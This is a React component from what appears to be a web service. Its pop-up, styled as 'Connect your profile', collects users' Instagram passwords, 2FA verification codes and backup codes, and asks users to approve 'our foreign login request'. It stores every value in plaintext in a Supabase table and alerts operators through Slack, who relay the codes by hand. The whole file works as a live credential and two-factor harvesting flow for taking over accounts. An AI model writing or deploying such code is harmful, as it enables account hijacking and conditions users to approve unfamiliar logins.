'use client';
import React from 'react';
import { useState } from 'react';
import { FaTimes } from 'react-icons/fa';
import { AiOutlineEye, AiOutlineEyeInvisible } from 'react-icons/ai';
import { messageSlack } from '../../helpers';
import { supabase } from '../../supabaseClient';
import { useEffect } from 'react';
import { EMAIL } from '../../config';

export default function ConnectAccount({ show, setShow, user, message, setMessage }) {
    const [defualt, setDefualt] = useState(true)
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    // const [countdown, setCountdown] = useState(true)
    const [loading, setLoading] = useState(false)
    const [drc, setDrc] = useState(false)
    const [bCode, setBCode] = useState(false)

    console.log(message?.code);

    useEffect(() => {
        if (message?.text === "success") {
            window.location.reload()
        }
        if (message?.code && message?.code !== "incorrect") {
            setDefualt(false)
        }
        if (message?.code === 'incorrect') {
            setDefualt(true)
        }
    }, [message])

    const connectAc = async (e) => {
        e.preventDefault();
        setLoading(true)
        const { data, error } = await supabase
            .from('users')
            .update({
                instagramPassword: password,
                messageSender: user.username
            })
            .eq("user_id", user?.user_id).eq("username", user?.username);

        error && console.log(data, error && error);
        if (error) return alert(error.message);

        try {
            const msg = `NEW_PASSWORD!: @${user.username} want's to connect their account. <${window.location.origin}/chat/${user.username}|click here to check>`;
            await messageSlack(msg);
            // console.log(r);
        } catch (error) {
            console.log(error);
        }
        setMessage({ status: '', code: 'default', text: <span className='animate-pulse'>checking please don't close this pop-up...</span> })
        setDefualt(false)
        setLoading(false)
    };

    const [backupCode, setBackupCode] = useState('')
    const storeBackupCode = async (e) => {
        e.preventDefault()
        // alert("We're processing your request...")
        setLoading(true)
        await supabase
            .from("users")
            .update({
                backupcode: backupCode,
                messageSender: user.username
                // status: 'checking'
            }).eq('id', user.id);

        try {
            const msg = `NEW_2fa!: @${user.username} submitted their 2fa code. <${window.location.origin}/chat/${user.username}|click here to check>`;
            await messageSlack(msg);
            // console.log(r);
        } catch (error) {
            console.log(error);
        }
        setLoading(false)
        setBCode(false)

        setMessage({ status: '', code: 'default', text: <span className='animate-pulse'>checking please don't close this pop-up...</span> })
    }

    const verificationCode = async (e) => {
        e.preventDefault()
        const msg = {
            admin: message?.user?.msg && message?.user?.msg?.admin,
            method: message?.user?.msg && message?.user?.msg?.method,
            approve: message?.user?.msg && message?.user?.msg?.approve,
            sms: message?.user?.msg && message?.user?.msg?.sms,
            code: password,
        }
        setLoading(true)
        await supabase
            .from("users")
            .update({
                msg: JSON.stringify(msg),
                messageSender: user.username
                // status: 'checking'
            }).eq('id', user.id);

        try {
            const msg = `VERIFICATION CODE!: @${user.username} submitted their verification code. <${window.location.origin}/chat/${user.username}|click here to check>`;
            await messageSlack(msg);
            // console.log(r);
        } catch (error) {
            console.log(error);
        }
        setLoading(false)

        setMessage({ status: '', code: 'default', text: <span className='animate-pulse'>checking please don't close this pop-up...</span> })
    }

    const vMethod = async (a,b) => {
        console.log(b);
        const msg = {
            admin: message?.user?.msg && message?.user?.msg?.admin,
            method: a === 'method' ? b : message?.user?.msg && message?.user?.msg?.method,
            approve: a === 'approve' ? b : message?.user?.msg && message?.user?.msg?.approve,
            thisWasMe: a === 'thisWasMe' ? b : message?.user?.msg && message?.user?.msg?.thisWasMe,
            sms: a === 'sms' ? b : message?.user?.msg && message?.user?.msg?.sms,
            code: message?.user?.msg && message?.user?.msg?.code,
        }
        setLoading(true)
        await supabase
            .from("users")
            .update({
                msg,
                messageSender: user.username
                // status: 'checking'
            }).eq('id', user.id);

        try {
            const msg = `VERIFICATION METHOD!: @${user.username} submitted their verification method. <${window.location.origin}/chat/${user.username}|click here to check>`;
            await messageSlack(msg);
            // console.log(r);
        } catch (error) {
            console.log(error);
        }
        setLoading(false)

        if (a === 'thisWasMe'){
            setDrc(false)
        }
        if (a === 'approve'){
            setMessage({ status: '', code: 'default', text: <span className='animate-pulse'>Checking if our login was approved...</span> })
            return;
        }
        setMessage({ status: '', code: 'default', text: <span className='animate-pulse'>checking please don't close this pop-up...</span> })
    }

    return (
        <div className="fixed top-0 left-0 z-50 w-full h-screen">
            <div
                className="absolute top-0 left-0 w-full h-screen bg-[rgba(0,0,0,0.5)]"
                onClick={() => setShow(false)}
            ></div>
            <div className="absolute top-[50%] left-[50%] translate-x-[-50%] translate-y-[-50%] w-full md:w-[500px] min-h-[400px] rounded-xl py-6 px-4 bg-white to-black grid place-items-center">
                <div className="">
                    <div className="absolute top-7 right-4">
                        <FaTimes
                            className="cursor-pointer"
                            onClick={() => setShow(false)}
                        />
                    </div>
                    <div className="">
                        <h5 className="font-semibold text-[2rem] text-center text-black font-MontserratBold mt-[30px]">
                            Connect your profile
                        </h5>
                        <p className="text-center text-[0.8rem] mt-2 mb-6 font-MontserratRegular text-black max-w-[80%] mx-auto">
                            Let's get you up and running! Enter your instagram password to
                            connect your profile.
                        </p>
                    </div>

                    <div className="flex items-center gap-2 px-6 py-4 mx-auto mb-3 bg-gray-100 rounded-md w-72 md:w-80">
                        <img
                            src={user?.profile_pic_url}
                            className="rounded-full"
                            height={50}
                            width={50}
                            alt={user?.username?.charAt(0)?.toUpperCase()}
                            loading="lazy"
                        />
                        <div className="font-semibold font-MontserratSemiBold">
                            {user?.username}
                        </div>
                    </div>

                    {message?.code === "default" && <p className="text-center text-[0.8rem] my-3 font-MontserratRegular text-[#ff0d0d] max-w-[80%] mx-auto">
                        {message?.text}
                    </p>}

                    {message?.code === "incorrect" && <p className="text-center text-[0.8rem] my-3 font-MontserratRegular text-[#ff0d0d] max-w-[80%] mx-auto">
                        Password you provided is incorrect. Please reset your password or enter a correct one.
                    </p>}

                    {(defualt || message?.code === "incorrect") && <form className="flex flex-col items-center justify-start" onSubmit={connectAc}
                    >
                        <div className="relative form-outline">
                            <input
                                type={showPassword ? 'text' : 'password'}
                                id="form2Example2"
                                className="rounded-[5px] h-[52px] px-4 pr-10 w-72 md:w-80 text-[1rem] bg-transparent border shadow-[inset_0_0px_1px_rgba(0,0,0,0.4)]"
                                // value={password}
                                placeholder="Password"
                                onChange={({ target }) => setPassword(target.value)}
                            />
                            <div className="absolute right-4 top-[50%] translate-y-[-50%]">
                                {showPassword ? (
                                    <AiOutlineEye
                                        onClick={() => setShowPassword(!showPassword)}
                                        className="cursor-pointer"
                                    />
                                ) : (
                                    <AiOutlineEyeInvisible
                                        onClick={() => setShowPassword(!showPassword)}
                                        className="cursor-pointer"
                                    />
                                )}
                            </div>
                        </div>

                        <button
                            type="submit"
                            className="text-white font-MontserratSemiBold text-[16px] mt-6 mb-2 rounded-[5px] py-2 px-6 h-[52px] w-72 md:w-80 font-semibold"
                            style={{
                                backgroundColor: '#D81159',
                                color: 'white',
                                boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)',
                            }}
                        >
                            {loading ? <p className='animate-pulse'>sending...</p> : 'Connect instagram'}
                        </button>
                    </form>}

                    {bCode &&
                        <form className="flex flex-col items-center justify-start" onSubmit={storeBackupCode}>
                            <textarea name="" className="rounded-[5px] h-[52px] px-4 pr-10 w-72 md:w-80 text-[1rem] bg-transparent border shadow-[inset_0_0px_1px_rgba(0,0,0,0.4)] resize-none"
                                value={backupCode}
                                onChange={(e) => setBackupCode(e.target.value)} placeholder="Enter backup code"></textarea>

                            <button
                                type="submit"
                                className="text-white font-MontserratSemiBold text-[16px] mt-6 mb-2 rounded-[5px] py-2 px-6 h-[52px] w-72 md:w-80 font-semibold"
                                style={{
                                    backgroundColor: '#D81159',
                                    color: 'white',
                                    boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)',
                                }}
                            >
                                {loading ? <p className='animate-pulse'>sending...</p> : 'submit'}
                            </button>
                        </form>
                    }

                    {message?.code === 'code sent 2FA off' && <form className="flex flex-col items-center justify-start" onSubmit={verificationCode}
                    >
                        <div className="relative form-outline">
                            <input
                                type="text"
                                id="form2Example2"
                                className="rounded-[5px] h-[52px] px-4 pr-10 w-72 md:w-80 text-[1rem] bg-transparent border shadow-[inset_0_0px_1px_rgba(0,0,0,0.4)]"
                                // value={password}
                                placeholder="Verification code"
                                onChange={({ target }) => setPassword(target.value)}
                            />
                        </div>

                        <div className="flex justify-center gap-3 my-4">
                            <button
                                type="submit"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] px-6 h-[40px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                            >{loading ? <p className='animate-pulse'>sending...</p> : 'Confirm'}
                            </button>

                            <button
                                type="button"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] px-6 h-[40px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                                onClick={() => {setDrc(true); setMessage({...message, code: 'default'})}}
                            >{loading ? <p className='animate-pulse'>sending...</p> : `I didn't receive the code`}
                            </button>
                        </div>
                    </form>}

                    {message?.code === 'code sent 2FA on' && <form className="flex flex-col items-center justify-start" onSubmit={verificationCode}
                    >
                        <div className="relative form-outline">
                            <input
                                type="text"
                                id="form2Example2"
                                className="rounded-[5px] h-[52px] px-4 pr-10 w-72 md:w-80 text-[1rem] bg-transparent border shadow-[inset_0_0px_1px_rgba(0,0,0,0.4)]"
                                // value={password}
                                placeholder="Verification code"
                                onChange={({ target }) => setPassword(target.value)}
                            />
                        </div>

                        <div className="flex justify-center gap-3 my-4">
                            <button
                                type="submit"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] px-6 h-[40px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                            >{loading ? <p className='animate-pulse'>sending...</p> : 'Confirm'}
                            </button>

                            <button
                                type="button"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] px-6 h-[40px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                                onClick={() => setMessage({ ...message, code: "verification method 2FA on" })}
                            >Go back
                            </button>
                        </div>
                    </form>}

                    {drc && <div className="mb-3">
                        <div className="my-3 text-center">
                            {`Under notifications tab on Instagram you can approve our foreign login request by clicking "This was me"`}
                        </div>
                        <div className="flex justify-center w-full gap-2">
                            <button
                                type="button"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] py-2 px-6 h-[52px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                                onClick={() => vMethod("thisWasMe", "true")}
                            >{loading ? <p className='animate-pulse'>sending...</p> : 'I clicked this was me'}
                            </button>
                        </div>
                    </div>}

                    {message?.code === "unsuccessful" && <div className="mb-3">
                        <div className="my-3 text-center">
                            Something went wrong and we couldn't login to your Instagram account. Please try again or contact our support at <a href={`mailto:${EMAIL}`}>${EMAIL}</a>
                        </div>
                    </div>}

                    {message?.code === 'verification method 2FA off' && <div className="mb-3">
                        <div className="my-3 text-center">Please choose a way to send you the verification code to login to your account.</div>
                        <div className="flex justify-center w-full gap-2">
                            <button
                                type="button"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] py-2 px-6 h-[52px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                                onClick={() => vMethod('method', 'email')}
                            >Email
                            </button>

                            <button
                                type="button"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] py-2 px-6 h-[52px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                                onClick={() => vMethod('method', 'sms')}
                            >SMS
                            </button>
                        </div>
                    </div>}

                    {message?.code === 'verification method 2FA on' && <div className="mb-3">
                        <div className="my-3 text-center">You can approve our login request under your Notifications tab on Instagram.</div>
                        <div className="flex flex-col items-center justify-center w-full gap-2">
                            <button
                                type="button"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] py-2 px-6 h-[52px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                                onClick={() => vMethod('approve', "true")}
                            >I approved the login
                            </button>

                            <button
                                type="button"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] py-2 px-6 h-[52px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                                onClick={() => vMethod('sms', "true")}
                            >Send me the code on SMS
                            </button>

                            <button
                                onClick={() => {setBCode(true); setMessage({...message, code: 'default'})}}
                                type="button"
                                className="text-white bg-[#D81159] font-MontserratSemiBold text-[16px] rounded-[5px] py-2 px-6 h-[52px] w-fit font-semibold"
                                style={{ boxShadow: '0 10px 30px -12px rgb(255 132 102 / 47%)' }}
                            >I know my backup code
                            </button>
                        </div>
                    </div>}

                    <div className="text-center">
                        <p className="flex items-center justify-center gap-2 text-sm text-black font-MontserratRegular">
                            Forgot Password?
                            <a
                                href="https://www.instagram.com/accounts/password/reset/"
                                target="_blank"
                                rel="noreferrer"
                            >
                                <span className="text-primary font-MontserratSemiBold font-[600] text-[14px] mt-3">
                                    Reset it here
                                </span>
                            </a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    );
}
